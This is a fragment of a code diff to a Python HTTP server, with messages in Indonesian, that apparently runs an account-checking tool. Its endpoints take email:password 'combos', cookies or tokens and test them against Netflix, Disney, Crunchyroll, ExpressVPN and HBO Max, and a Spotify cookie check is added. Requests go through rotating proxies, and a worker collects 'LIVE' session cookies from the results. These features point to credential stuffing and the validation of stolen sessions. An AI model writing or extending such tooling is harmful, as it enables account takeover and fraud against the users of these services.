                 self.wfile.write(b'{"error": "Unauthorized: PIN required"}')
                 return
@@ -2089,6 +1858,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 data = get_history(limit=limit, offset=offset, search=search, status=status, plan=plan, entry_type=entry_type)
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(json.dumps(data).encode("utf-8"))
 
@@ -2100,6 +1870,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.send_response(200)
                 self.send_header("Content-Type", "text/csv; charset=utf-8")
                 self.send_header("Content-Disposition", f"attachment; filename=netflix_history_{int(time.time())}.csv")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(csv_data.encode("utf-8"))
 
@@ -2107,6 +1878,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 an = get_analytics()
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(json.dumps(an).encode("utf-8"))
 
@@ -2119,11 +1891,13 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     p_list = all_tested_proxies if all_tested_proxies else load_proxies()
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(json.dumps({"raw_text": raw_text, "list": p_list}).encode("utf-8"))
 
         else:
             self.send_response(404)
+            self.send_cors_headers()
             self.end_headers()
 
     def do_POST(self):
@@ -2136,6 +1910,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.send_response(429)
                 self.send_header("Content-Type", "application/json")
                 self.send_header("Retry-After", "60")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(b'{"error": "Too Many Requests: PIN rate limit exceeded."}')
                 return
@@ -2147,10 +1922,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 ok = (not req_pin) or hmac.compare_digest(pin_input, req_pin)
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(json.dumps({"ok": ok}).encode("utf-8"))
             except Exception as e:
                 self.send_response(400)
+                self.send_cors_headers()
                 self.end_headers()
 
         elif self.path == "/api/pin/set":
@@ -2158,6 +1935,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 self.send_response(429)
                 self.send_header("Content-Type", "application/json")
                 self.send_header("Retry-After", "60")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(b'{"error": "Too Many Requests: PIN rate limit exceeded."}')
                 return
@@ -2169,6 +1947,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 if cur_pin and not hmac.compare_digest(cur_input, cur_pin):
                     self.send_response(401)
                     self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
                     self.end_headers()
                     self.wfile.write(json.dumps({"ok": False, "error": "PIN saat ini salah"}).encode("utf-8"))
                     return
@@ -2176,6 +1955,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 if new_p and len(new_p) > 20:
                     self.send_response(400)
                     self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
                     self.end_headers()
                     self.wfile.write(json.dumps({"ok": False, "error": "PIN terlalu panjang (maks 20 karakter)"}).encode("utf-8"))
                     return
@@ -2183,18 +1963,21 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 save_config(cfg)
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))
             except Exception as e:
                 self.send_response(400)
+                self.send_cors_headers()
                 self.end_headers()
 
-        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check", "/api/hbomax/token", "/api/proxies/save", "/api/proxies/test", "/api/history/clear", "/api/system/reload"):
-            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/hbomax/check", "/api/hbomax/token") else 50
+        elif self.path in ("/api/token", "/api/check", "/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check", "/api/proxies/save", "/api/proxies/test", "/api/history/clear", "/api/system/reload"):
+            rate_limit = 200 if self.path in ("/api/disney/check", "/api/crunchyroll/check", "/api/expressvpn/check", "/api/spotify/check") else 50
             if is_rate_limited(client_ip, max_requests=rate_limit, window_seconds=10, bucket="api"):
                 self.send_response(429)
                 self.send_header("Content-Type", "application/json")
                 self.send_header("Retry-After", "5")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(b'{"error": "Too Many Requests. Rate limit exceeded."}')
                 return
@@ -2202,6 +1985,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
             if not check_pin_authorized(self.headers):
                 self.send_response(401)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(b'{"error": "Unauthorized: PIN required"}')
                 return
@@ -2223,6 +2007,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     res = json.dumps({"error": str(e)}).encode("utf-8")
                     self.send_response(400)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(res)
 
@@ -2236,6 +2021,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     res = json.dumps({"live": False, "reason": str(e)}).encode("utf-8")
                     self.send_response(400)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(res)
 
@@ -2262,6 +2048,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                     self.send_response(400)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(res)
 
@@ -2287,6 +2074,7 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                     self.send_response(400)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(res)
 
@@ -2305,10 +2093,15 @@ class Handler(http.server.BaseHTTPRequestHandler):
                                 password = password.strip()
                     if not email or not password:
                         raise ValueError("Email dan password wajib diisi")
+                    def _evpn_proxy_fn():
+                        prx, label, raw = get_random_proxy()
+                        if prx:
+                            return prx.get('http') or prx.get('https')
+                        return None
                     out = check_expressvpn_account(
                         email, password,
                         use_proxy=p.get("use_proxy", True),
-                        get_proxy_fn=get_random_proxy,
+                        get_proxy_fn=_evpn_proxy_fn,
                         save_history_fn=save_history
                     )
                     # Save ExpressVPN result to history DB
@@ -2334,47 +2127,24 @@ class Handler(http.server.BaseHTTPRequestHandler):
                     res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                     self.send_response(400)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(res)
 
-            elif self.path == "/api/hbomax/check":
+            elif self.path == "/api/spotify/check":
                 try:
                     p = json.loads(body.decode("utf-8"))
-                    email = p.get("email", "").strip()
-                    password = p.get("password", "").strip()
-                    if not email or not password:
-                        combo = p.get("combo", "").strip()
-                        if combo:
-                            combo_clean = combo.split(" | ")[0].strip() if " | " in combo else combo
-                            if ":" in combo_clean:
-                                email, password = combo_clean.split(":", 1)
-                                email = email.strip()
-                                password = password.strip()
-                    if not email or not password:
-                        raise ValueError("Email dan password wajib diisi")
-                    out = check_hbomax_account(email, password, use_proxy=p.get("use_proxy", True))
+                    cookie = p.get("cookie", "").strip()
+                    if not cookie:
+                        raise ValueError("Cookie wajib diisi")
+                    out = check_spotify_cookie(cookie, use_proxy=p.get("use_proxy", True))
                     res = json.dumps(out).encode("utf-8")
                     self.send_response(200)
                 except Exception as e:
                     res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
                     self.send_response(400)
                 self.send_header("Content-Type", "application/json")
-                self.end_headers()
-                self.wfile.write(res)
-
-            elif self.path == "/api/hbomax/token":
-                try:
-                    p = json.loads(body.decode("utf-8"))
-                    token = p.get("token", "").strip()
-                    if not token:
-                        raise ValueError("Token (access_token / refresh_token) wajib diisi")
-                    out = check_hbomax_token(token, use_proxy=p.get("use_proxy", True))
-                    res = json.dumps(out).encode("utf-8")
-                    self.send_response(200)
-                except Exception as e:
-                    res = json.dumps({"status": "ERROR", "reason": str(e)}).encode("utf-8")
-                    self.send_response(400)
-                self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(res)
 
@@ -2390,22 +2160,26 @@ class Handler(http.server.BaseHTTPRequestHandler):
                         all_tested_proxies.clear()
                     self.send_response(200)
                     self.send_header("Content-Type", "application/json")
+                    self.send_cors_headers()
                     self.end_headers()
                     self.wfile.write(json.dumps({"ok": True, "count": len(all_p)}).encode("utf-8"))
                 except Exception as e:
                     self.send_response(400)
+                    self.send_cors_headers()
                     self.end_headers()
 
             elif self.path == "/api/proxies/test":
                 test_all_proxies_now()
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(json.dumps({"ok": True}).encode("utf-8"))
 
             elif self.path == "/api/system/reload":
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(b'{"status": "reloading"}')
                 def _do_exit():
@@ -2421,10 +2195,12 @@ class Handler(http.server.BaseHTTPRequestHandler):
                 clear_history(only_dead=only_dead)
                 self.send_response(200)
                 self.send_header("Content-Type", "application/json")
+                self.send_cors_headers()
                 self.end_headers()
                 self.wfile.write(b'{"status": "cleared"}')
         else:
             self.send_response(404)
+            self.send_cors_headers()
             self.end_headers()
 
 def session_vault_worker():
@@ -2435,7 +2211,7 @@ def session_vault_worker():
             with db_lock:
                 conn = get_db()
                 c = conn.cursor()
-                c.execute('SELECT id, raw_cookie FROM history WHERE status = "LIVE" AND raw_cookie != "" ORDER BY id DESC LIMIT 10')
+                c.execute('SELECT id, raw_cookie FROM history WHERE status = "LIVE" AND raw_cookie != "" ORDER BY id DESC LIMIT 25')
                 rows = c.fetchall()
                 conn.close()
 
